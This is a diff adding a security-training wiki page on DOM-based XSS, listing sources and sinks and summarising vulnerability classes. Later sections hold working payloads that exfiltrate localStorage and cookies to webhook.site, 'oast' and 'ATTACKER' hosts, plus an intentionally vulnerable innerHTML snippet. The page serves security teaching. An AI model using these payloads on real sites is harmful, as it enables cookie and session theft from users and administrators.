@@ -1,0 +1,396 @@
+# DOM XSS
+
+{{#include ../../banners/hacktricks-training.md}}
+
+## DOM Vulnerabilities
+
+DOM vulnerabilities occur when data from attacker-controlled **sources** (like `location.search`, `document.referrer`, or `document.cookie`) is unsafely transferred to **sinks**. Sinks are functions or objects (e.g., `eval()`, `document.body.innerHTML`) that can execute or render harmful content if given malicious data.
+
+- **Sources** are inputs that can be manipulated by attackers, including URLs, cookies, and web messages.
+- **Sinks** are potentially dangerous endpoints where malicious data can lead to adverse effects, such as script execution.
+
+The risk arises when data flows from a source to a sink without proper validation or sanitation, enabling attacks like XSS.
+
+> [!TIP]
+> **You can find a more updated list of sources and sinks in** [**https://github.com/wisec/domxsswiki/wiki**](https://github.com/wisec/domxsswiki/wiki)
+
+**Common sources:**
+
+```javascript
+document.URL
+document.documentURI
+document.URLUnencoded
+document.baseURI
+location
+document.cookie
+document.referrer
+window.name
+history.pushState
+history.replaceState
+localStorage
+sessionStorage
+IndexedDB(mozIndexedDB, webkitIndexedDB, msIndexedDB)
+Database
+```
+
+**Common Sinks:**
+
+| [**Open Redirect**](dom-xss.md#open-redirect)                                    | [**Javascript Injection**](dom-xss.md#javascript-injection)                         | [**DOM-data manipulation**](dom-xss.md#dom-data-manipulation) | **jQuery**                                                             |
+| -------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------- | ------------------------------------------------------------- | ---------------------------------------------------------------------- |
+| `location`                                                                       | `eval()`                                                                            | `scriptElement.src`                                           | `add()`                                                                |
+| `location.host`                                                                  | `Function() constructor`                                                            | `scriptElement.text`                                          | `after()`                                                              |
+| `location.hostname`                                                              | `setTimeout()`                                                                      | `scriptElement.textContent`                                   | `append()`                                                             |
+| `location.href`                                                                  | `setInterval()`                                                                     | `scriptElement.innerText`                                     | `animate()`                                                            |
+| `location.pathname`                                                              | `setImmediate()`                                                                    | `someDOMElement.setAttribute()`                               | `insertAfter()`                                                        |
+| `location.search`                                                                | `execCommand()`                                                                     | `someDOMElement.search`                                       | `insertBefore()`                                                       |
+| `location.protocol`                                                              | `execScript()`                                                                      | `someDOMElement.text`                                         | `before()`                                                             |
+| `location.assign()`                                                              | `msSetImmediate()`                                                                  | `someDOMElement.textContent`                                  | `html()`                                                               |
+| `location.replace()`                                                             | `range.createContextualFragment()`                                                  | `someDOMElement.innerText`                                    | `prepend()`                                                            |
+| `open()`                                                                         | `crypto.generateCRMFRequest()`                                                      | `someDOMElement.outerText`                                    | `replaceAll()`                                                         |
+| `domElem.srcdoc`                                                                 | **\`\`**[**Local file-path manipulation**](dom-xss.md#local-file-path-manipulation) | `someDOMElement.value`                                        | `replaceWith()`                                                        |
+| `XMLHttpRequest.open()`                                                          | `FileReader.readAsArrayBuffer()`                                                    | `someDOMElement.name`                                         | `wrap()`                                                               |
+| `XMLHttpRequest.send()`                                                          | `FileReader.readAsBinaryString()`                                                   | `someDOMElement.target`                                       | `wrapInner()`                                                          |
+| `jQuery.ajax()`                                                                  | `FileReader.readAsDataURL()`                                                        | `someDOMElement.method`                                       | `wrapAll()`                                                            |
+| `$.ajax()`                                                                       | `FileReader.readAsText()`                                                           | `someDOMElement.type`                                         | `has()`                                                                |
+| **\`\`**[**Ajax request manipulation**](dom-xss.md#ajax-request-manipulation)    | `FileReader.readAsFile()`                                                           | `someDOMElement.backgroundImage`                              | `constructor()`                                                        |
+| `XMLHttpRequest.setRequestHeader()`                                              | `FileReader.root.getFile()`                                                         | `someDOMElement.cssText`                                      | `init()`                                                               |
+| `XMLHttpRequest.open()`                                                          | `FileReader.root.getFile()`                                                         | `someDOMElement.codebase`                                     | `index()`                                                              |
+| `XMLHttpRequest.send()`                                                          | [**Link manipulation**](dom-xss.md#link-manipulation)                               | `someDOMElement.innerHTML`                                    | `jQuery.parseHTML()`                                                   |
+| `jQuery.globalEval()`                                                            | `someDOMElement.href`                                                               | `someDOMElement.outerHTML`                                    | `$.parseHTML()`                                                        |
+| `$.globalEval()`                                                                 | `someDOMElement.src`                                                                | `someDOMElement.insertAdjacentHTML`                           | [**Client-side JSON injection**](dom-xss.md#client-side-sql-injection) |
+| **\`\`**[**HTML5-storage manipulation**](dom-xss.md#html-5-storage-manipulation) | `someDOMElement.action`                                                             | `someDOMElement.onevent`                                      | `JSON.parse()`                                                         |
+| `sessionStorage.setItem()`                                                       | [**XPath injection**](dom-xss.md#xpath-injection)                                   | `document.write()`                                            | `jQuery.parseJSON()`                                                   |
+| `localStorage.setItem()`                                                         | `document.evaluate()`                                                               | `document.writeln()`                                          | `$.parseJSON()`                                                        |
+| **``**[**`Denial of Service`**](dom-xss.md#denial-of-service)**``**              | `someDOMElement.evaluate()`                                                         | `document.title`                                              | **\`\`**[**Cookie manipulation**](dom-xss.md#cookie-manipulation)      |
+| `requestFileSystem()`                                                            | **\`\`**[**Document-domain manipulation**](dom-xss.md#document-domain-manipulation) | `document.implementation.createHTMLDocument()`                | `document.cookie`                                                      |
+| `RegExp()`                                                                       | `document.domain`                                                                   | `history.pushState()`                                         | [**WebSocket-URL poisoning**](dom-xss.md#websocket-url-poisoning)      |
+| [**Client-Side SQl injection**](dom-xss.md#client-side-sql-injection)            | [**Web-message manipulation**](dom-xss.md#web-message-manipulation)                 | `history.replaceState()`                                      | `WebSocket`                                                            |
+| `executeSql()`                                                                   | `postMessage()`                                                                     | \`\`                                                          | \`\`                                                                   |
+
+The **`innerHTML`** sink doesn't accept `script` elements on any modern browser, nor will `svg onload` events fire. This means you will need to use alternative elements like `img` or `iframe`.
+
+This kind of XSS is probably the **hardest to find**, as you need to look inside the JS code, see if it's **using** any object whose **value you control**, and in that case, see if there is **any way to abuse** it to execute arbitrary JS.
+
+## Tools to find them
+
+- [https://github.com/mozilla/eslint-plugin-no-unsanitized](https://github.com/mozilla/eslint-plugin-no-unsanitized)
+- Browser extension to check all data that reaches a potential sink: [https://github.com/kevin-mizu/domloggerpp](https://github.com/kevin-mizu/domloggerpp)
+
+## Examples
+
+### Open Redirect
+
+From: [https://portswigger.net/web-security/dom-based/open-redirection](https://portswigger.net/web-security/dom-based/open-redirection)<sup>[[1]](#references)</sup>
+
+**Open redirect vulnerabilities in the DOM** occur when a script writes data, which an attacker can control, into a sink capable of initiating navigation across domains.
+
+It's crucial to understand that executing arbitrary code, such as **`javascript:alert(1)`**, is possible if you have control over the start of the URL where the redirection occurs.<sup>[[1]](#references)</sup>
+
+Sinks:
+
+```javascript
+location
+location.host
+location.hostname
+location.href
+location.pathname
+location.search
+location.protocol
+location.assign()
+location.replace()
+open()
+domElem.srcdoc
+XMLHttpRequest.open()
+XMLHttpRequest.send()
+jQuery.ajax()
+$.ajax()
+```
+
+### Cookie manipulation
+
+From: [https://portswigger.net/web-security/dom-based/cookie-manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation)<sup>[[2]](#references)</sup>
+
+DOM-based cookie-manipulation vulnerabilities occur when a script incorporates data, which can be controlled by an attacker, into the value of a cookie. This vulnerability can lead to unexpected behavior of the webpage if the cookie is utilized within the site. Additionally, it can be exploited to carry out a session fixation attack if the cookie is involved in tracking user sessions. The primary sink associated with this vulnerability is:<sup>[[2]](#references)</sup>
+
+Sinks:
+
+```javascript
+document.cookie
+```
+
+### JavaScript Injection
+
+From: [https://portswigger.net/web-security/dom-based/javascript-injection](https://portswigger.net/web-security/dom-based/javascript-injection)<sup>[[3]](#references)</sup>
+
+DOM-based JavaScript injection vulnerabilities are created when a script runs data, which can be controlled by an attacker, as JavaScript code.<sup>[[3]](#references)</sup>
+
+Sinks:
+
+```javascript
+eval()
+Function() constructor
+setTimeout()
+setInterval()
+setImmediate()
+execCommand()
+execScript()
+msSetImmediate()
+range.createContextualFragment()
+crypto.generateCRMFRequest()
+```
+
+### Document-domain manipulation
+
+From: [https://portswigger.net/web-security/dom-based/document-domain-manipulation](https://portswigger.net/web-security/dom-based/document-domain-manipulation)<sup>[[4]](#references)</sup>
+
+**Document-domain manipulation vulnerabilities** occur when a script sets the `document.domain` property using data that an attacker can control.
+
+The `document.domain` property plays a **key role** in the **enforcement** of the **same-origin policy** by browsers. When two pages from different origins set their `document.domain` to the **same value**, they can interact without restrictions. Although browsers impose certain **limits** on the values assignable to `document.domain`, preventing the assignment of completely unrelated values to the actual page origin, exceptions exist. Typically, browsers permit the use of **child** or **parent domains**.<sup>[[4]](#references)</sup>
+
+Sinks:
+
+```javascript
+document.domain
+```
+
+### WebSocket-URL poisoning
+
+From: [https://portswigger.net/web-security/dom-based/websocket-url-poisoning](https://portswigger.net/web-security/dom-based/websocket-url-poisoning)<sup>[[5]](#references)</sup>
+
+**WebSocket-URL poisoning** occurs when a script utilizes **controllable data as the target URL** for a WebSocket connection.<sup>[[5]](#references)</sup>
+
+Sinks:
+
+The `WebSocket` constructor can lead to WebSocket-URL poisoning vulnerabilities.
+
+### Link manipulation
+
+From: [https://portswigger.net/web-security/dom-based/link-manipulation](https://portswigger.net/web-security/dom-based/link-manipulation)<sup>[[6]](#references)</sup>
+
+**DOM-based link-manipulation vulnerabilities** arise when a script writes **attacker-controllable data to a navigation target** within the current page, such as a clickable link or the submission URL of a form.<sup>[[6]](#references)</sup>
+
+Sinks:
+
+```javascript
+someDOMElement.href
+someDOMElement.src
+someDOMElement.action
+```
+
+### Ajax request manipulation
+
+From: [https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation)<sup>[[7]](#references)</sup>
+
+**Ajax request manipulation vulnerabilities** arise when a script writes **attacker-controllable data into an Ajax request** that is issued using an `XmlHttpRequest` object.<sup>[[7]](#references)</sup>
+
+Sinks:
+
+```javascript
+XMLHttpRequest.setRequestHeader()
+XMLHttpRequest.open()
+XMLHttpRequest.send()
+jQuery.globalEval()
+$.globalEval()
+```
+
+### Local file-path manipulation
+
+From: [https://portswigger.net/web-security/dom-based/local-file-path-manipulation](https://portswigger.net/web-security/dom-based/local-file-path-manipulation)<sup>[[8]](#references)</sup>
+
+**Local file-path manipulation vulnerabilities** arise when a script passes **attacker-controllable data to a file-handling API** as the `filename` parameter. This vulnerability can be exploited by an attacker to construct a URL that, if visited by another user, could lead to the **user's browser opening or writing an arbitrary local file**.<sup>[[8]](#references)</sup>
+
+Sinks:
+
+```javascript
+FileReader.readAsArrayBuffer()
+FileReader.readAsBinaryString()
+FileReader.readAsDataURL()
+FileReader.readAsText()
+FileReader.readAsFile()
+FileReader.root.getFile()
+FileReader.root.getFile()
+```
+
+### Client-Side SQl injection
+
+From: [https://portswigger.net/web-security/dom-based/client-side-sql-injection](https://portswigger.net/web-security/dom-based/client-side-sql-injection)<sup>[[9]](#references)</sup>
+
+**Client-side SQL-injection vulnerabilities** occur when a script incorporates **attacker-controllable data into a client-side SQL query in an unsafe way**.<sup>[[9]](#references)</sup>
+
+Sinks:
+
+```javascript
+executeSql()
+```
+
+### HTML5-storage manipulation
+
+From: [https://portswigger.net/web-security/dom-based/html5-storage-manipulation](https://portswigger.net/web-security/dom-based/html5-storage-manipulation)<sup>[[10]](#references)</sup>
+
+**HTML5-storage manipulation vulnerabilities** arise when a script **stores attacker-controllable data in the web browser's HTML5 storage** (`localStorage` or `sessionStorage`). While this action is not inherently a security vulnerability, it becomes problematic if the application subsequently **reads the stored data and processes it unsafely**. This could allow an attacker to leverage the storage mechanism to conduct other DOM-based attacks, such as cross-site scripting and JavaScript injection.<sup>[[10]](#references)</sup>
+
+Sinks:
+
+```javascript
+sessionStorage.setItem()
+localStorage.setItem()
+```
+
+### XPath injection
+
+From: [https://portswigger.net/web-security/dom-based/client-side-xpath-injection](https://portswigger.net/web-security/dom-based/client-side-xpath-injection)<sup>[[11]](#references)</sup>
+
+**DOM-based XPath-injection vulnerabilities** occur when a script incorporates **attacker-controllable data into an XPath query**.<sup>[[11]](#references)</sup>
+
+Sinks:
+
+```javascript
+document.evaluate()
+someDOMElement.evaluate()
+```
+
+### Client-side JSON injection
+
+From: [https://portswigger.net/web-security/dom-based/client-side-json-injection](https://portswigger.net/web-security/dom-based/client-side-json-injection)<sup>[[12]](#references)</sup>
+
+**DOM-based JSON-injection vulnerabilities** occur when a script incorporates **attacker-controllable data into a string that is parsed as a JSON data structure and then processed by the application**.<sup>[[12]](#references)</sup>
+
+Sinks:
+
+```javascript
+JSON.parse()
+jQuery.parseJSON()
+$.parseJSON()
+```
+
+### Web-message manipulation
+
+From: [https://portswigger.net/web-security/dom-based/web-message-manipulation](https://portswigger.net/web-security/dom-based/web-message-manipulation)<sup>[[13]](#references)</sup>
+
+**Web-message vulnerabilities** arise when a script sends **attacker-controllable data as a web message to another document** within the browser.<sup>[[13]](#references)</sup> An **example** of vulnerable Web-message manipulation can be found at [PortSwigger's Web Security Academy](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source).
+
+Sinks:
+
+The `postMessage()` method for sending web messages can lead to vulnerabilities if the event listener for receiving messages handles the incoming data in an unsafe way.
+
+### DOM-data manipulation
+
+From: [https://portswigger.net/web-security/dom-based/dom-data-manipulation](https://portswigger.net/web-security/dom-based/dom-data-manipulation)<sup>[[14]](#references)</sup>
+
+**DOM-data manipulation vulnerabilities** arise when a script writes **attacker-controllable data to a field within the DOM** that is utilized within the visible UI or client-side logic. This vulnerability can be exploited by an attacker to construct a URL that, if visited by another user, can alter the appearance or behaviour of the client-side UI.<sup>[[14]](#references)</sup>
+
+Sinks:
+
+```javascript
+scriptElement.src
+scriptElement.text
+scriptElement.textContent
+scriptElement.innerText
+someDOMElement.setAttribute()
+someDOMElement.search
+someDOMElement.text
+someDOMElement.textContent
+someDOMElement.innerText
+someDOMElement.outerText
+someDOMElement.value
+someDOMElement.name
+someDOMElement.target
+someDOMElement.method
+someDOMElement.type
+someDOMElement.backgroundImage
+someDOMElement.cssText
+someDOMElement.codebase
+document.title
+document.implementation.createHTMLDocument()
+history.pushState()
+history.replaceState()
+```
+
+### Denial of Service
+
+From: [https://portswigger.net/web-security/dom-based/denial-of-service](https://portswigger.net/web-security/dom-based/denial-of-service)<sup>[[15]](#references)</sup>
+
+**DOM-based denial-of-service vulnerabilities** occur when a script passes **attacker-controllable data unsafely to a problematic platform API**. This includes APIs that, when invoked, can lead the user's computer to consume **excessive amounts of CPU or disk space**. Such vulnerabilities can have significant side effects, such as the browser restricting the website's functionality by rejecting attempts to store data in `localStorage` or terminating busy scripts.<sup>[[15]](#references)</sup>
+
+Sinks:
+
+```javascript
+requestFileSystem()
+RegExp()
+```
+
+## Dom Clobbering
+
+
+{{#ref}}
+dom-clobbering.md
+{{#endref}}
+
+## Implicit globals & `window.name` abuse
+
+Referencing `name` without a declaration (`var`/`let`/`const`) resolves to `window.name`. Because `window.name` persists across cross-origin navigations, an attacker can pre-seed a browsing context name with HTML/JS and later have victim code render it as trusted data:
+
+- Open/navigate the target in a named context you control:
+
+```html
+<iframe name="<img src=x onerror=fetch('https://oast/?f='+btoa(localStorage.flag))>" src="https://target/page"></iframe>
+```
+
+- Or reuse `window.open` with a crafted target name:
+
+```javascript
+window.open('https://target/page', "<svg/onload=alert(document.domain)>")
+```
+
+If the application later does `element.innerHTML = name` (or similar sink) without sanitization, the attacker-controlled `window.name` string executes in the target origin, enabling DOM XSS and access to same-origin storage.<sup>[[16]](#references)</sup>
+
+## Admin/automation flows: pre-seeded storage & `javascript:` navigation
+
+Automation bots (e.g., Playwright) often visit an internal page first, set secrets in `localStorage`/cookies, then navigate to user-supplied URLs. Any DOM XSS primitive (including `window.name` abuse) in that flow can exfiltrate the seeded secret:
+
+```javascript
+fetch('https://webhook.site/<id>?flag=' + encodeURIComponent(localStorage.getItem('flag')))
+```
+
+If the bot does not restrict schemes, supplying a `javascript:` URL (`javascript:fetch(...)`) executes in the current origin without new navigation, directly leaking storage values.<sup>[[16]](#references)</sup>
+
+## Template literal `innerHTML` + partial sanitization gaps
+
+Frontends that sanitize only selected fields but still interpolate an untrusted one directly into `innerHTML` are trivially exploitable. Example:
+
+```javascript
+fetch(`${window.location.origin}/admin/bug_reports`).then(r => r.json()).then(reports => {
+  reports.forEach(report => {
+    reportCard.innerHTML = `
+      <div>${DOMPurify.sanitize(report.id)}</div>
+      <div>${report.details}</div> <!-- unsanitized sink -->
+    `;
+  });
+});
+```
+
+If the un-sanitized field is stored server-side (e.g., bug report “details”), the payload becomes **stored DOM XSS** for any privileged viewer of the list. A simple payload such as `<img src=x onerror=fetch('http://ATTACKER/?c='+document.cookie)>` executes when an admin opens the page and exfiltrates their cookies.
+
+When the app explicitly disables `SESSION_COOKIE_HTTPONLY` (e.g., Flask `app.config['SESSION_COOKIE_HTTPONLY'] = False`), the stolen cookie immediately grants the admin session even if the signing secret rotates on each boot (random `secret_key` prevents forging, but theft still works).<sup>[[17]](#references)</sup>
+
+## References
+
+- [1] [PortSwigger: DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection)
+- [2] [PortSwigger: DOM-based cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation)
+- [3] [PortSwigger: DOM-based JavaScript injection](https://portswigger.net/web-security/dom-based/javascript-injection)
+- [4] [PortSwigger: DOM-based document-domain manipulation](https://portswigger.net/web-security/dom-based/document-domain-manipulation)
+- [5] [PortSwigger: DOM-based WebSocket-URL poisoning](https://portswigger.net/web-security/dom-based/websocket-url-poisoning)
+- [6] [PortSwigger: DOM-based link manipulation](https://portswigger.net/web-security/dom-based/link-manipulation)
+- [7] [PortSwigger: DOM-based Ajax request-header manipulation](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation)
+- [8] [PortSwigger: DOM-based local file-path manipulation](https://portswigger.net/web-security/dom-based/local-file-path-manipulation)
+- [9] [PortSwigger: DOM-based client-side SQL injection](https://portswigger.net/web-security/dom-based/client-side-sql-injection)
+- [10] [PortSwigger: DOM-based HTML5-storage manipulation](https://portswigger.net/web-security/dom-based/html5-storage-manipulation)
+- [11] [PortSwigger: DOM-based client-side XPath injection](https://portswigger.net/web-security/dom-based/client-side-xpath-injection)
+- [12] [PortSwigger: DOM-based client-side JSON injection](https://portswigger.net/web-security/dom-based/client-side-json-injection)
+- [13] [PortSwigger: DOM-based web-message manipulation](https://portswigger.net/web-security/dom-based/web-message-manipulation)
+- [14] [PortSwigger: DOM-data manipulation](https://portswigger.net/web-security/dom-based/dom-data-manipulation)
+- [15] [PortSwigger: DOM-based denial of service](https://portswigger.net/web-security/dom-based/denial-of-service)
+- [16] [Flagvent 2025 (Medium) — pink, Santa’s Wishlist, Christmas Metadata, Captured Noise](https://0xdf.gitlab.io/flagvent2025/medium)
+- [17] [HTB: Imagery (stored DOM XSS via partial DOMPurify + session theft)](https://0xdf.gitlab.io/2026/01/24/htb-imagery.html)
+
+{{#include ../../banners/hacktricks-training.md}}
